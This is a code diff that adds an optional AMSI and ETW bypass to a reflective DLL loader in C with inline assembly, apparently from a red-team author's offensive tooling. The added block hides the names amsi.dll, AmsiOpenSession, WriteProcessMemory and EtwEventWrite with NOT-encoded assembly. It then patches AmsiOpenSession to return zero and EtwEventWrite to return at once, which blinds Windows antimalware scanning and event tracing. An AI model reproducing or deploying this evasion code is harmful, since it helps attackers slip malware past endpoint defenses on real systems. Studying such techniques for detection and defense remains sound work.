@@ -1,6 +1,10 @@
 // Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
 // Credits: Stephen Fewer (@stephenfewer) & SEKTOR7 Crew (@SEKTOR7net) https://institute.sektor7.net/
 #include <windows.h>
+#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
+#ifdef BYPASS
+typedef BOOL    (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
+#endif
 typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );
 typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR lpLibFileName);
 typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE hModule, LPCSTR lpProcName);
@@ -140,6 +144,98 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[loadLibraryAStr] "r" (loadLibraryAStr)
 	);
 	pLoadLibraryA  = getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+// ######### OPTIONAL BYPASS AMSI & ETW CODE ########
+	#ifdef BYPASS
+	// ######### AMSI.AmsiOpenSession Bypass
+	char amsiStr[] = "f!@.24#.62#6.2#"; // have space in reserved bytes for null string terminator
+	//char amsiStr[] = "amsi.dll12345678;
+	// python reverse.py amsi.dll12345678
+	// String length : 8
+	//   lld.isma : 6c6c642e69736d61
+	__asm__(
+		"mov rsi, %[amsiStr] \n"
+		"xor rdx, rdx \n"                // null string terminator
+		"mov r11, 0x93939BD1968C929E \n" // NOT lld.isma : 6c6c642e69736d61
+		"not r11 \n"
+		"mov [rsi], r11 \n"
+		"mov [rsi+0x8], rdx \n"
+		: // no output
+		:[amsiStr] "r" (amsiStr)
+	);	
+	PVOID amsiAddr = (PVOID)crawlLdrDllList((PVOID)amsiStr); // check if amsi.dll is already loaded into the process
+	// If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
+	if (amsiAddr == NULL){
+		amsiAddr = (PVOID)pLoadLibraryA((LPCSTR)(amsiStr));
+	}
+	PVOID amsiExportDirectory    = getExportDirectory(amsiAddr);
+	PVOID amsiExAddrTable        = getExportAddressTable(amsiAddr, amsiExportDirectory);
+	PVOID amsiExNamePointerTable = getExportNameTable(amsiAddr, amsiExportDirectory);
+	PVOID amsiExOrdinalTable     = getExportOrdinalTable(amsiAddr, amsiExportDirectory);
+	// char AmsiOpenSession[] = "AmsiOpenSession";
+	char AmsiOpenSessionStr[] = "1#.4t.-4/.2u$42";
+	// python reverse.py AmsiOpenSession   <--- Python Script from Vivek / Pentester Academy SLAE64 course
+	// String length : 15
+	//   noisseS : 6e6f6973736553
+	//   nepOismA : 6e65704f69736d41
+	__asm__(
+		"mov rsi, %[AmsiOpenSessionStr] \n"
+		"mov r8,  0xFF9190968C8C9AAC \n" // NOT noisseS : 6e6f6973736553
+		"mov rdx, 0x919A8FB0968C92BE \n" // NOT nepOismA : 6e65704f69736d41
+		"not rdx \n"
+		"not r8 \n"
+		"mov [rsi], rdx \n"
+		"mov [rsi+0x8], r8 \n"
+		: // no output
+		:[AmsiOpenSessionStr] "r" (AmsiOpenSessionStr)
+	);
+	PVOID AmsiOpenSessionStrLen = (PVOID)15;
+	PVOID pAmsiOpenSession  = getSymbolAddress(AmsiOpenSessionStr, AmsiOpenSessionStrLen, amsiAddr, amsiExAddrTable, amsiExNamePointerTable, amsiExOrdinalTable);
+	SIZE_T bytesWritten;
+	unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
+	char WriteProcessMemoryStr[] = "g90.-13#5@3.-t3;5#9-.[3";
+	// $ python reverse.py WriteProcessMemory
+	// String length : 18
+	//   yr : 7972
+	//   omeMssec : 6f6d654d73736563
+	//   orPetirW : 6f72506574697257
+	__asm__(
+		"mov rsi, %[WriteProcessMemoryStr] \n"
+		"mov rcx, 0xFFFFFFFFFFFF868D \n" // NOT yr       : 7972
+		"mov rdx, 0x90929AB28C8C9A9C \n" // NOT omeMssec : 6f6d654d73736563
+		"mov r11, 0x908DAF9A8B968DA8 \n" // NOT orPetirW : 6f72506574697257
+		"not rcx \n"
+		"not r11 \n"
+		"not rdx \n"
+		"mov [rsi], r11 \n"
+		"mov [rsi+0x8], rdx \n"
+		"mov [rsi+0x10], rcx \n"
+		: // no output
+		:[WriteProcessMemoryStr] "r" (WriteProcessMemoryStr)
+	);	
+	tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(WriteProcessMemoryStr, (PVOID)18, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
+	pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
+	// ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
+	char EtwEventWriteStr[] = "f9#.^124.-.32";
+	// python reverse.py EtwEventWrite
+	// String length : 13
+	//   etirW    : 6574697257
+	//   tnevEwtE : 746e657645777445
+	__asm__(
+		"mov rsi, %[EtwEventWriteStr] \n"
+		"mov r8,  0xFFFFFF9A8B968DA8 \n" // NOT etirW    : 6574697257
+		"mov rdx, 0x8B919A89BA888BBA \n" // NOT tnevEwtE : 746e657645777445
+		"not rdx \n"
+		"not r8 \n"
+		"mov [rsi], rdx \n"
+		"mov [rsi+0x8], r8 \n"
+		: // no output
+		:[EtwEventWriteStr] "r" (EtwEventWriteStr)
+	);
+	PVOID EtwEventWriteStrLen = (PVOID)13;
+	PVOID pEtwEventWrite  = getSymbolAddress(EtwEventWriteStr, EtwEventWriteStrLen, ntdllAddr, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);
+	unsigned char etwbypass[] = { 0xc3 }; // ret
+	pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, sizeof(etwbypass), &bytesWritten);
+	#endif
 
 // ######### SOURCE RDLL BASE ADDRESS - GET ADDRESS ########
 	// Find ourselves in memory by searching for "MZ" 
